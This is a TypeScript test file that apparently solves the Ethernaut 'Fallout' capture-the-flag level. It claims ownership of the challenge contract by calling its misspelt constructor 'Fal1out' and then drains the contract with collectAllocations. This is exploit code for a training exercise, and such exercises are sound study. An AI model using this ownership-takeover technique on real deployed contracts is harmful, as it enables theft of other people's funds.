import { expect } from "chai";
import { Contract, ContractTransaction, Signer } from "ethers";
import { setupTest } from "./utils";

let eoa: Signer;
let challenge: Contract; // challenge contract

// Setup challenge level instance, eoa, attacker and before/after hooks
(async () => {
  const contractLevel = "0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639";
  const contractName = "Fallout";
  ({ eoa, challenge } = await setupTest(contractLevel, { contractName }));
})();

it("solves the challenge", async () => {
  // the constructor is misspelt 'Fal1out' allowing anyone to call it and claim ownership
  const tx: ContractTransaction = await challenge.Fal1out();
  await tx.wait();
  // verify we are the owner of contract
  const [owner, eoaAddress] = await Promise.all([
    challenge.owner(),
    eoa.getAddress(),
  ]);
  expect(owner).to.equal(eoaAddress);
  // collect monies
  await challenge.collectAllocations();
});
